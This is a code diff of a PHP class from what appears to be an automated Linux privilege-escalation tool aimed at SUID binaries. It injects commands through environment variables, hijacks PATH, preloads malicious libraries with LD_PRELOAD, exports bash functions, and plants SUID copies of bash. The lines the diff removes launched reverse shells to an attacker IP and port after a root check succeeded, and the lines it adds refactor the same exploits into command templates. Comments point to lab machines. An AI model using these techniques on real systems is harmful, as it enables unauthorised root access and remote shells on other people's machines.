@@ -61,7 +61,7 @@ class check4linux8suid extends check4linux8exploits{
 Many times, we do want to see if there are any files owned by those users outside their home directory.");
         
         $query = "echo '".base64_encode($lines)."' | base64 -d $this->filter_file_path  | grep -v \":\" ";
-        $this->requette($query);
+        //$this->requette($query);
         exec($query,$tmp);
         
         $tab_suid = array_filter(array_unique($tmp));
@@ -70,7 +70,7 @@ Many times, we do want to see if there are any files owned by those users outsid
         $this->pause();
         
         //$tab_suid = array("/usr/local/bin/whoisme");
-        //$tab_suid = array("/usr/bin/bwrap");
+        $tab_suid = array("/scripts/find");
         
         $this->suids4all($tab_suid);
         
@@ -115,7 +115,7 @@ Many times, we do want to see if there are any files owned by those users outsid
             $this->pause();
         }
         
-    
+        return 0;
         
         $data = "find /tmp -type f -maxdepth 5 -mmin -60 -exec ls -al {} \; 2> /dev/null";
         $this->lan2stream4result($data,$this->stream_timeout);
@@ -201,17 +201,11 @@ Many times, we do want to see if there are any files owned by those users outsid
 
         
         $cmd = "/usr/bin/id";
-        $data = "export $var=\"$cmd\" ; $suid_path ";        // OK
-        if( $this->lan2root4check8id($data,__FUNCTION__.": $data")){
-            $attacker_ip = $this->ip4addr4target($this->ip);
-            $attacker_port = rand(1024,65535);
-            $shell = "/bin/bash";
-            $cmd = $this->rev8sh($attacker_ip, $attacker_port, $shell);
-            $data = "export $var=\"$cmd\" ; $suid_path ";
-            $lines = $this->lan2pentest($attacker_port,"T",__FUNCTION__.": $data",$data,500);
-            $result .= $lines;
-            
-        }
+        $template_id_euid = "export $var=\"%ID%\" ; $suid_path ";       
+
+        $this->lan2pentest8id($template_id_euid);
+        
+ 
         return $result;
     }
   
@@ -320,18 +314,9 @@ Many times, we do want to see if there are any files owned by those users outsid
         //$this->lan2stream4result($data,$this->stream_timeout);
         
         $template_id_euid = "echo \"%ID%\" > $this->vm_tmp_lin/$suid_call ; chmod 755 $this->vm_tmp_lin/$suid_call ; export PATH=\"$this->vm_tmp_lin:\$PATH\" ; $suid ";        // OK
-        $templateB64_cmd = base64_encode(str_replace("%ID%","%CMD%", $template_id_euid));
 
-        if( $this->lan2root4check8id($data,$templateB64_cmd)){
-            $attacker_ip = $this->ip4addr4target($this->ip);
-            $attacker_port = rand(1024,65535);
-            $attacker_port = 6666;
-            $shell = "/bin/sh";
-            $cmd = addslashes($this->rev8fifo($attacker_ip, $attacker_port, $shell));
-            $data = "echo \"$cmd\" > $this->vm_tmp_lin/$suid_call ; chmod 755 $this->vm_tmp_lin/$suid_call ; export PATH=\"$this->vm_tmp_lin:\$PATH\" ; $suid ";
-            $this->lan2pentest($attacker_port,"T",$templateB64_cmd,$this->templateB64_shell,$data,500);
-
-        }
+        $this->lan2pentest8id($template_id_euid);
+        
         }
     }
     
@@ -401,17 +386,10 @@ EOC;
                 $result .= $lines;
                 $this->pause();
                 
-                $data = "export LD_PRELOAD=$this->vm_tmp_lin/libsuid ; $suid_path id"; 
-                if( $this->lan2root4check8id($data,__FUNCTION__.": $data")){
-                    $attacker_ip = $this->ip4addr4target($this->ip);
-                    $attacker_port = rand(1024,65535);
-                    $shell = "/bin/sh";
-                    $cmd = $this->rev8sh($attacker_ip, $attacker_port, $shell);
-                    $data = "export LD_PRELOAD=$this->vm_tmp_lin/libsuid ; $suid_path $cmd";
-                    $lines = $this->lan2pentest($attacker_port,"T",__FUNCTION__.": $data",$data,500);
-                    $result .= $lines;
-                    
-                }
+                $template_id_euid = "export LD_PRELOAD=$this->vm_tmp_lin/libsuid ; $suid_path \"%ID%\""; 
+
+                $this->lan2pentest8id($template_id_euid);
+                
                 $this->pause();
                 
                 
@@ -485,9 +463,7 @@ EOC;
                     $this->article("username now", $username_now);
                     //$this->pause();
                     if ($username_now !== $username_found){
-                        $attacker_ip = $this->ip4addr4target($this->ip);
-                        $attacker_port = rand(1024,65535);
-                        $shell = "/bin/sh";
+
                         $cmd_lib = "id";
                         //$cmd_lib = $this->rev8sh($attacker_ip, $attacker_port, $shell);
                         $lib_bash = $this->c2so($cmd_lib);
@@ -515,7 +491,7 @@ EOC;
                         
                         $template_id_test = "/tmp/bash_$username_now"."_$username_found -p -c %ID%";
                         
-                        $this->lan2pentest8id($template_id_test,$attacker_ip,$attacker_port,$shell);
+                        $this->lan2pentest8id($template_id_test);
                     }
                 }
                 
@@ -537,10 +513,6 @@ EOC;
                             $this->article("username now", $username_now);
                             //$this->pause();
                             if ($username_now!==$username_found){
-                                $attacker_ip = $this->ip4addr4target($this->ip);
-                                $attacker_port = rand(1024,65535);
-
-                                $shell = "/bin/bash";
                                 
                                 $cmd_lib = "cp /bin/bash /tmp/bash_$username_now"."_$username_found && chmod 6777 /tmp/bash_$username_now"."_$username_found";
                                 $lib_bash = $this->c2so($cmd_lib);
@@ -578,7 +550,7 @@ EOC;
                                 
                                 
                                 
-                                $this->lan2pentest8id($template_id_test,$attacker_ip,$attacker_port,$shell);
+                                $this->lan2pentest8id($template_id_test);
 
                                }
                                 
@@ -623,18 +595,9 @@ EOC;
     
     public function suids8env2path4function($suid,$filepath_call){ // OK //billu box 2
         $this->ssTitre(__FUNCTION__);
-        $data = "function $filepath_call () { /usr/bin/id; } ; export -f $filepath_call; $suid ";        // OK
-        if( $this->lan2root4check8id($data,__FUNCTION__.": $data")){
-            $attacker_ip = $this->ip4addr4target($this->ip);
-            $attacker_port = rand(1024,65535);
-            $shell = "/bin/sh";
-            $cmd = $this->rev8sh($attacker_ip, $attacker_port, $shell);
-            
-            $data = "function $filepath_call () { $cmd; } ; export -f $filepath_call; $suid  ";
-            $this->lan2pentest($attacker_port,"T",base64_encode($data),$data,500);
-
-            
-        }
+        $template_id_euid = "function $filepath_call () { %ID%; } ; export -f $filepath_call; $suid ";        // OK
+        $this->lan2pentest8id($template_id_euid);
+        
     }
     
 
@@ -650,10 +613,7 @@ EOC;
         $this->lan2stream4result($data,$this->stream_timeout);
         
         $template_id_euid = "/tmp/$hash_suid -p -c %ID% ";
-        $attacker_ip = $this->ip4addr4target($this->ip);
-        $attacker_port = rand(1024,65535);
-        $shell = "/bin/sh";
-        $this->lan2pentest8id($template_id_euid,$attacker_ip,$attacker_port,$shell);
+        $this->lan2pentest8id($template_id_euid);
     }
     
     
